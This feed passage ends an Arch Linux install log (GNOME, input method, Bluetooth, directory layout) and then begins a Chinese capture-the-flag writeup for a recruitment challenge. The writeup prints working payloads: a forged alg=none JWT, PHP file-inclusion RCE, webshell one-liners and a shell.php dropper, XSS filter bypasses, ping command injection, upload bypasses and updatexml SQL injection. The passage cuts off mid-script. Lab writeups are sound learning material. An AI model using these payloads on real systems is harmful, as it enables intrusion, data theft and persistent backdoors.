title="安装Gnome桌面"></a>安装Gnome桌面</h4><blockquote><p>GNOME是一个<strong>自由开源的桌面环境</strong>，是 Linux 操作系统中最常用的桌面环境之一。 GNOME的目标是为 Linux 系统提供现代、易用的桌面环境，以提高用户的体验和生产力。 它提供了一个用户友好的界面和许多常用的应用程序，如文件管理器、文本编辑器、终端、图形 图像处理 程序</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S gnome gnome-tweaks <span class="comment">//然后一路回车</span></span><br></pre></td></tr></table></figure><h4 id="安装相应的显卡驱动"><a href="#安装相应的显卡驱动" class="headerlink" title="安装相应的显卡驱动"></a>安装相应的显卡驱动</h4><p><strong>注意这里只要安装集显驱动而不要安装英伟达驱动，原因是arch linux可能检测不到</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S mesa xf86-video-b</span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70c0780b3.png" alt="image-20231203014043573"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable gdm</span><br></pre></td></tr></table></figure><blockquote><p>GDM (The GNOME Display Manager)是GNOME显示环境的管理器，并被用来替代原来的X Display Manager</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot </span><br></pre></td></tr></table></figure><p>于是就进入gnome桌面了</p><h4 id="下载软件"><a href="#下载软件" class="headerlink" title="下载软件"></a>下载软件</h4><p>下载fcirx输入法、浏览器等必要软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S git ntfs-3g wqy-zenhei firefox fcitx5-im fcitx5-chinese-addons</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;etc&#x2F;environment是设置整个系统的环境，而&#x2F;etc&#x2F;profile是设置所有用户的环境，前者与登录用户无关，后者与登录用户有关。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/environment</span><br></pre></td></tr></table></figure><p>输入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line"></span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line"></span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line"></span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line"></span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70c17dd35.png" alt="image-20231203014725348" style="zoom: 200%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>设置中文输入法</p><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70c28133b.png" alt="image-20231203015046687" style="zoom:200%;" /><p>注意这个输入法是用<em><strong>ctrl+空格</strong></em>启用的</p><h4 id="设置蓝牙连接"><a href="#设置蓝牙连接" class="headerlink" title="设置蓝牙连接"></a>设置蓝牙连接</h4><p>安装蓝牙模块并启动蓝牙服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S bluez bluez-utils</span><br><span class="line">sudo systemctl enable bluetooth.service</span><br><span class="line">sudo systemctl start bluetooth.service</span><br></pre></td></tr></table></figure><p>Bluez是Linux系统上的蓝牙协议栈，自带了很多有用的工具，Bluetoothctl就是其一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bluetoothctl --help          查看帮助命令</span><br><span class="line">bluetoothctl -v              查看蓝牙版本</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bluetoothctl            进入蓝牙管理工具环境</span><br><span class="line">[bluetooth]# power on                打开蓝牙</span><br><span class="line">[bluetooth]# agent on                开启代理</span><br><span class="line">[bluetooth]# scan on                 扫描蓝牙设备</span><br><span class="line">[bluetooth]# pair xx:xx:xx:...       配对该设备</span><br><span class="line">[bluetooth]# trust xx:xx:xx:...      信任该设备</span><br><span class="line">[bluetooth]# connect xx:xx:...       连接该设备</span><br><span class="line">[bluetooth]# disconnect xx:xx:...    断开蓝牙</span><br></pre></td></tr></table></figure><p>安装蓝牙音频</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S pulseaudio-bluetooth</span><br></pre></td></tr></table></figure><p>蓝牙图形化管理工具安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S bluedevil</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S blueman</span><br></pre></td></tr></table></figure><h4 id="完结撒花🌸"><a href="#完结撒花🌸" class="headerlink" title="完结撒花🌸"></a>完结撒花🌸</h4><h2 id="Linux-系统结构"><a href="#Linux-系统结构" class="headerlink" title="Linux 系统结构"></a>Linux 系统结构</h2><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70c37eec5.png"></p><blockquote><ul><li><p><strong>&#x2F;bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</p></li><li><p><strong>&#x2F;boot：</strong><br>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p></li><li><p><strong>&#x2F;dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p></li><li><p><strong>&#x2F;etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p></li><li><p><strong>&#x2F;home</strong>：<br>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</p></li><li><p><strong>&#x2F;lib</strong>：<br>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p></li><li><p><strong>&#x2F;lost+found</strong>：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p></li><li><p><strong>&#x2F;media</strong>：<br>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p></li><li><p><strong>&#x2F;mnt</strong>：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。</p></li><li><p><strong>&#x2F;opt</strong>：<br>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p></li><li><p><strong>&#x2F;proc</strong>：<br>proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure></li><li><p><strong>&#x2F;root</strong>：<br>该目录为系统管理员，也称作超级权限者的用户主目录。</p></li><li><p><strong>&#x2F;sbin</strong>：<br>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。</p></li><li><p><strong>&#x2F;selinux</strong>：<br> 这个目录是 Redhat&#x2F;CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p></li><li><p><strong>&#x2F;srv</strong>：<br> 该目录存放一些服务启动之后需要提取的数据。</p></li><li><p><strong>&#x2F;sys</strong>：</p><p>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。</p><p>sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。</p><p>该文件系统是内核设备树的一个直观反映。</p><p>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p></li><li><p><strong>&#x2F;tmp</strong>：<br>tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。</p></li><li><p><strong>&#x2F;usr</strong>：<br> usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</p></li><li><p><strong>&#x2F;usr&#x2F;bin：</strong><br>系统用户使用的应用程序。</p></li><li><p><strong>&#x2F;usr&#x2F;sbin：</strong><br>超级用户使用的比较高级的管理程序和系统守护程序。</p></li><li><p><strong>&#x2F;usr&#x2F;src：</strong><br>内核源代码默认的放置目录。</p></li><li><p><strong>&#x2F;var</strong>：<br>var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p></li><li><p><strong>&#x2F;run</strong>：<br>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 &#x2F;var&#x2F;run 目录，应该让它指向 run。</p></li></ul><p>在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。</p><p><strong>&#x2F;etc</strong>： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。</p><p><strong>&#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin</strong>: 这是系统预设的执行文件的放置目录，比如 <strong>ls</strong> 就是在 <strong>&#x2F;bin&#x2F;ls</strong> 目录下的。</p><p>值得提出的是 <strong>&#x2F;bin</strong>、**&#x2F;usr&#x2F;bin** 是给系统用户使用的指令（除 root 外的通用用户），而&#x2F;sbin, &#x2F;usr&#x2F;sbin 则是给 root 使用的指令。</p><p><strong>&#x2F;var</strong>： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 &#x2F;var&#x2F;log 目录下，另外 mail 的预设放置也是在这里。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p>本文参考：</p><p><a href="https://blog.csdn.net/luotuo28/article/details/125000308">ip link 命令总结-CSDN博客</a></p><p><a href="https://www.linuxcool.com/">Linux命令大全(手册) – 真正好用的Linux命令在线查询网站 (linuxcool.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/544554354">linux中ctl代表什么缩写？很多命令都带结尾ctl，另外ifconfig和nmcli有什么区别？ - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/596227524">Arch Linux 详细安装教程，萌新再也不怕了！「2023.10」 - 知乎 (zhihu.com)</a></p><p><a href="https://www.bilibili.com/video/BV1XY4y1f77S/?spm_id_from=333.337.search-card.all.click">【超简单】Windows+Arch Linux双系统双磁盘方案，全程不废话_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/tonglin12138/article/details/87706009">Linux—带你区分”根目录” 和 “家目录”_根目录、家目录的路径分别是什么?可以用什么符号表示,用来快速访问?-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_61683908/article/details/129430286">https://blog.csdn.net/qq_61683908/article/details/129430286</a></p><p><a href="https://blog.csdn.net/weixin_35443436/article/details/116649342">linux下的mnt文件夹用来干嘛,Linux&#x2F;mnt目录主要用于什么？_Killer Seven的博客-CSDN博客</a></p><p><a href="https://wiki.archlinux.org/">ArchWiki (archlinux.org)</a></p><p><a href="https://zhuanlan.zhihu.com/p/492509251">Linux 黑话解释：Linux 中的 GRUB 是什么？ | Linux 中国 - 知乎 (zhihu.com)</a></p><p><a href="https://cloud.tencent.com/developer/techpedia/2001">什么是GNOME_GNOME简介_GNOME的优势以及应用场景-腾讯云开发者社区 (tencent.com)</a></p><p><a href="https://www.cnblogs.com/x_wukong/p/4771316.html">etc&#x2F;profile和&#x2F;etc&#x2F;environment的比较 - 明明是悟空 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/qq_36390239/article/details/123118489">ArchLinux安装使用蓝牙之基础_archlinux 蓝牙_kler的博客-CSDN博客</a></p><p><a href="https://www.runoob.com/linux/linux-system-contents.html">Linux 系统目录结构 | 菜鸟教程 (runoob.com)</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装Arch-Linux的记录&quot;&gt;&lt;a href=&quot;#安装Arch-Linux的记录&quot; class=&quot;headerlink&quot; title=&quot;安装Arch Linux的记录&quot;&gt;&lt;/a&gt;安装Arch Linux的记录&lt;/h1&gt;&lt;p&gt;第一次安装双系统，虽然是参考b站教程</summary>
      
    
    
    
    <category term="Learningr ecord" scheme="https://foreon.github.io/categories/Learningr-ecord/"/>
    
    
    <category term="linux" scheme="https://foreon.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>YuLin 2023 Recruit Writeup</title>
    <link href="https://foreon.github.io/posts/36124.html"/>
    <id>https://foreon.github.io/posts/36124.html</id>
    <published>2023-11-03T15:56:39.000Z</published>
    <updated>2023-12-02T18:15:14.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="YuLin-2023-Recruit-Writeup"><a href="#YuLin-2023-Recruit-Writeup" class="headerlink" title="YuLin 2023 Recruit Writeup"></a>YuLin 2023 Recruit Writeup</h1><h1 id="前言（叠个甲先"><a href="#前言（叠个甲先" class="headerlink" title="前言（叠个甲先"></a>前言（叠个甲先</h1><h3 id="part1是用word写的，直接黏贴过来量太多就不修改了😭，part2-是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇"><a href="#part1是用word写的，直接黏贴过来量太多就不修改了😭，part2-是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇" class="headerlink" title="part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇"></a>part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇</h3><h1 id="part1"><a href="#part1" class="headerlink" title="part1:"></a>part1:</h1><h1 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h1><h1 id="1-http"><a href="#1-http" class="headerlink" title="1.http"></a>1.http</h1><p>这里要注意，admin是改cookie里的admin&#x3D;1!</p><p>2.302跳转</p><p>查看源代码找到&#x2F;302.php</p><p>Curl -i 找到flag</p><p>3.encode</p><p>关于decode可以看看这个链接</p><p><a href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a></p><p>判断第一个是md5</p><p>解密得到Yulin</p><p>判断第二个是hex编码</p><p>解码得到Sec{we_mu5t_kn0w</p><p>第三个是base64</p><p>解码得到_c0mm0n</p><p>判断第四个是html实体编码</p><p>解码得到_enc0d1ngs}</p><p>组合一下得到flag</p><p>YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs}</p><p>4.Method</p><p>被提示有很多http<br>method</p><p>拿postman一个个试就试出来了</p><p>5.cal-1</p><p>源代码进去改下长度就完事</p><p>6.cal-2</p><p>发现要用post的方法传数据，就完事了</p><p>7.cal-3</p><p>用python脚本做</p><p>我还学了好一会，感觉python脚本是个大问题</p><p>import requests<br>s&#x3D;requests.Session()<br>url&#x3D;’<a href="http://43.142.109.233:44504/index.php">http://43.142.109.233:44504/index.php</a>‘<br>r&#x3D;s.get(url)  </p><p>res&#x3D;r.text  </p><p>a&#x3D;res.find(“<p>“)<br>b&#x3D;res.find(“&#x2F;p&gt;”,a)<br>#找到我们要计算的式子的前后位置<br>num&#x3D;res[a+3:b-1]<br>print(a)<br>print(b)<br>print(num)<br>r&#x3D;s.post(url,data&#x3D;{‘result’:eval(num)})<br>print(r.content)</p><p>8.https</p><p>前言:</p><p>经大佬提醒,了解了不少jwt知识</p><p>了解到两种主要思路</p><p>1.弱口令把key爆出来</p><p>2.使用none的方式</p><p>由于安装不清楚第一次所需的工具😅，所以采用第二种方法</p><p>原理如下所示</p><p>本题抓包发现token,于是采用jwt绕过</p><p>1.将头部信息的alg值改为none，并进行base64加密</p><p>2.将声明部分的admin值改为true，也进行base64加密</p><p>3.新组合的JWT应该为<code>头部``.``声明``.</code>(因为头部中的加密方式为none，所以签名部分可以舍去)，但又由于&#x3D;号会与url解码产生歧义，所以需要将&#x3D;号删除，而Base64URL是支持这种写法的</p><p>最终的JWT值为ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9.</p><p>4.把token放到cookie里得到flag</p><p>LFI</p><ol><li></li></ol><p>依照提示传参即可</p><ol start="2"><li></li></ol><p>不知道为啥hackbar的post这类题用不了？</p><p>那就用postman来post</p><p>使用file&#x3D;php:&#x2F;&#x2F;input + post <?phpsystem("ls");?></p><p>再file&#x3D;php:&#x2F;&#x2F;input + post <?php system("catflag_195780473.txt");?></p><p>得到flag</p><ol start="3"><li></li></ol><h5 id="使用data-text-plain-base64-xxxx-base64编码后的数据"><a href="#使用data-text-plain-base64-xxxx-base64编码后的数据" class="headerlink" title="使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)"></a>使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</h5><p>data:&#x2F;&#x2F;text&#x2F;plain,<?phpsystem("ls")?></p><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p><p>data:&#x2F;&#x2F;text&#x2F;plain,<?phpsystem("cat flag_8491675293")?></p><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p><p>得到flag</p><ol start="4"><li></li></ol><p>看到提示，直接想到用base64编码转出</p><p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>得到一串base64编码，转码之后即得到flag</p><ol start="5"><li></li></ol><p>看教程绕过file_get_contents($file) 了但是还对原理一知半解</p><p>采用第一种方式就拿到flag了</p><ol start="6"><li></li></ol><p>文档里说的很清楚了，话说我自己试的一句话木马<?php@eval($_POST["value"]);?>就不太好使，还得是图片里的这个好使，然后就生成一句话木马图片呗，然后蚁剑</p><p><code>&lt;?php</code><br><code>fputs(fopen(“shell.php”,&#39;w&#39;),&#39;&lt;?php @eval($_POST[”leon“])；?&gt;</code></p><p><code>&#39;</code><br><code>); ?&gt;</code></p><p>要注意的是蚁剑访问的目录是生成的shell.php</p><p>即为<a href="http://43.142.109.233:21005/shell.php">http://43.142.109.233:21005/shell.php</a></p><ol start="7"><li></li></ol><p>这题花了我大概一天的时间钻研，最终做出来了</p><p>参考：<a href="https://blog.csdn.net/qq_45521281/article/details/106665608">LFI 绕过 Session 包含限制 Getshell_通过sessid进行文件写即可,使用 file:&#x2F;&#x2F;localhost&#x2F; 进行绕过_zhang三的博客-CSDN博客</a></p><p>先了解session知识吧</p><p>Phpinfo先找到session的储存路径</p><p>Session自定义一个</p><p>然后传一个一句话木马</p><p>发现可以控制了</p><p>于是果断蚁剑解出</p><p>补一个大佬的做法：</p><p>思路更清晰一些</p><p>XSS</p><p>看看这这篇攻略<a href="https://blog.csdn.net/qq_42357070/article/details/83818283">XSS挑战赛解题思路_多崎巡礼的博客-CSDN博客</a></p><ol><li></li></ol><p>看源代码发现有个hidden的 name</p><p>普普通通构造个playload就完事了</p><p><code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><ol start="2"><li></li></ol><p>这里我本来想用闭合标签来完成</p><p>但是发现&lt;被转义了，只能利用  <code>&#39;onmouseover=alert(1)//</code>，不过这里需要用单引号闭合，构造playload</p><ol start="3"><li></li></ol><p>和上题一样，只不过把单引号换成双引号来闭合罢了</p><ol start="4"><li></li></ol><p>第四题发现会把on转成o_n</p><p>而且会给<script><br> </script>中间的东西加双引号</p><p>于是上网查攻略,知道要用伪协议</p><p><code>&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</code></p><p><code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code></p><p><code>&quot;&gt;</code><br><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt;</code></p><p><code>&quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; //</code></p><p><code>就做出来了</code></p><p><code>5.</code></p><h2 id="试了试”"><a href="#试了试”" class="headerlink" title="试了试”&gt;"></a>试了试”&gt;</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;<span class="regexp">/script&gt; /</span>/</span><br></pre></td></tr></table></figure><p>可能是屏蔽了script,于是思路是双写绕过</p><h2 id="alert-0"><a href="#alert-0" class="headerlink" title="&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//"></a><code>&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//</code></h2><p>这些双写也可以</p><p>就拿到flag了</p><ol start="6"><li></li></ol><p>用伪协议发现过滤了javascript，于是查攻略吧</p><p><code>javascrip&amp;#x74;:alert(1)</code></p><p><code>javasc&amp;#x72;ipt:alert1</code></p><p><code>javasc&amp;#x0072;ipt:alert1</code></p><ol start="7"><li></li></ol><p>第一次见这种，猜测t_sort那里是隐藏的搜索框</p><p>于是看攻略吧</p><p>这里只要构造如下playload就行</p><p><code>t_sort=”type=’’text”</code><br><code>onclick = ”alert(1)</code></p><p>复现了一下发现这个双引号”不能用</p><p>得用下面的双引号</p><p>“</p><p>未解之谜，先放这吧</p><p><code>t_sort=&quot;type=&quot;text&quot;</code><br><code>onclick = &quot;alert(1)</code></p><p>XSS看攻略愉快的ak了</p><p>话说真的不是按这个攻略出题的吗(</p><p>RCE</p><ol><li></li></ol><p>在当前目录下没找，于是 ls &#x2F;</p><p>ping<br>127.0.0.1;ls &#x2F; #</p><p>找到flag</p><p>ping<br>127.0.0.1;cat &#x2F;flag_3124131231 #</p><ol start="2"><li></li></ol><p>ping<br>127.0.0.1;ls #</p><p>有waf</p><p>试了一下过滤了;|&amp;’&#96;等等</p><p>于是用<code>%0a``绕过</code></p><p><code>ip=127.0.0.1%0als /</code></p><p>再ip&#x3D;127.0.0.1%0acat<br>&#x2F;flag_31241421414</p><p>得到flag</p><ol start="3"><li></li></ol><p>试了一下过滤了ls</p><p>文件上传</p><ol><li></li></ol><p>采用了一种新的方式</p><p>传一句话木马文件蚁剑后门报错捏</p><p>于是火狐禁止js，传一个.php文件上去</p><p>路径是复制的图像链接</p><p>然后蚁剑后门</p><ol start="2"><li></li></ol><p>考察.htaccess文件</p><p>用记事本写这样一个名为.htaccess的文件</p><p>注意保存为所有类型</p><p>&lt;FilesMatch<br>“.png”&gt;</p><p>  SetHandler application&#x2F;x-httpd-php</p></FilesMatch><p>该文件的意思是，只要遇到文件名中包含有”.png”字符</p><p>串的，统一按照 php 文件来执行。然后就可以上传一个带一句话木马的文件，例如a_php.gif，会</p><p>被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想</p><p>被发现，留一个隐蔽的后门。</p><p>然后先上传.htaccess文件,再上次木马.png</p><p>然后蚁剑就完事了</p><ol start="3"><li></li></ol><p>上传php文件抓包，修改文件类型为image&#x2F;png</p><p>然后就可以上传了，于是愉快的蚁剑</p><ol start="4"><li></li></ol><p>考察文件头绕过</p><p>用winhex</p><p>但是这样修改后用蚁剑连接</p><p><a href="http://43.142.109.233:30004/upload/muma.png">http://43.142.109.233:30004/upload/muma.png</a></p><p>还是报错，于是再次采用上传php用burp改png的方法</p><p>其实也可以换一种生成shell.php的png图片木马</p><p>下次再试</p><p>然后蚁剑吧</p><ol start="5"><li></li></ol><p>很明显要绕过黑名单这些</p><p>但是明显黑名单太少了，这里先用大写绕过罢</p><p>然而大写绕过并不可行？</p><p>再次尝试双写绕过，成了，于是蚁剑</p><ol start="6"><li></li></ol><p>再次尝试双写</p><p>发现不行，添加了一个空格</p><p>这次大写绕过又行了？</p><p>那就蚁剑吧</p><ol start="7"><li></li></ol><p>提示%00截断</p><p>原理如下</p><p>照猫画虎就出来了</p><ol start="8"><li></li></ol><p>考察16进制00截断</p><p>Burp上传图片木马抓包</p><p>在路径后面加一个1.php+,再在hex里找到+对应的编码，并改成00,就跟上题一样了</p><ol start="9"><li></li></ol><p>提示白名单，但是试一下又觉得是黑名单？</p><p>双写大写绕过都没用，那试试别的吧</p><p>莫名奇妙做出来了？</p><p>改成这样</p><p>注意蚁剑连接phtml还是小心(为什么</p><p>这题要再做一遍</p><p>为什么这里多了个空格，怎么复现？</p><p>再做了一次为什么又没空格了，而且这里路径为什么不需要大写？</p><p>11.二次渲染</p><p>合成一个gif木马文件，注意文件头要对</p><p>还是不行？那还是找一张真正的gif合成吧</p><p>现在行了</p><p>下载gif，比对没有改变的地方</p><p>然后在不改变的地方插入一句话木马</p><p>蚁剑连图片链接老报错</p><p>去学了一下</p><p>其实用一个文件包含漏洞就能用蚁剑连接</p><p>要利用include.php?file&#x3D;upload&#x2F;</p><p>然后就可以用蚁剑连接了</p><p>网页也是可以访问的</p><ol start="12"><li></li></ol><p>提示是利用move_uploaded_file($temp_file,<br>$img_path)的漏洞，这个函数它有一个特性，会忽略到文件末尾的&#x2F;.</p><p>这样上传，然后burp抓包</p><p>把名字改成muma.php&#x2F;.</p><p>蚁剑连接 &#x2F;upload&#x2F;muma.php发现可以访问了</p><ol start="13"><li></li></ol><p>顺藤摸瓜找到了原帖（搜索能力也是能力！</p><p>直接看原帖吧，哥们代码审计还看不明白</p><p>Sql注入</p><p>1.普通注入</p><p>普普通通的整形闭合</p><p>如图所示做完</p><ol start="2"><li></li></ol><p>提示是报错注入</p><p>试了一下是整形闭合捏</p><p>以下黏贴之后的代码有问题</p><p>爆数据库</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p><p>    substr(</p><p>       (select group_concat(schema_name)</p><p>       from information_schema.schemata)</p><p>    , 1 , 31)</p><p>),3)<br>– a</p><p>爆表名</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p><p>    substr(</p><p>       (select group_concat(table_name)</p><p>       from information_schema.tables where<br>table_schema&#x3D;database())</p><p>    , 8 , 31)</p><p>),3)<br>– a</p><p>注意这里要取后面的字符才完整</p><p>爆列名</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p><p>    substr(</p><p>       (select group_concat(column_name)</p><p>       from information_schema.columns where<br>table_name&#x3D;’flag’)</p><p>    , 1 , 31)</p><p>),3)<br>– a</p><p>爆flag</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>  and updatexml(1,concat(‘~’,</p><p>    substr(</p><p>       (select group_concat(flag)</p><p>       from flag)</p><p>    , 10 , 31)</p><p>),3)<br>– a</p><p>注意flag太长显示不完全，分段来看吧</p><ol start="3"><li></li></ol><p>布尔盲注</p><p>一些基础知识</p><p>操作</p><p>开搞</p><p>试了一下发现是整形形闭合</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and length(database())&#x3D;8</p><p>尝试到8发现回显ok,说明数据库名为8</p><p>一个个把数据名试出来</p><p>推荐二分查找法</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and ASCII(SUBSTR(database(),2,1)) &#x3D; 101</p><p>ok查出来是security</p><p>发现搞不定啊,这工程量。。。还得上脚本</p><p>import requests</p><h1 id="只需要修改url-和-两个payload即可"><a 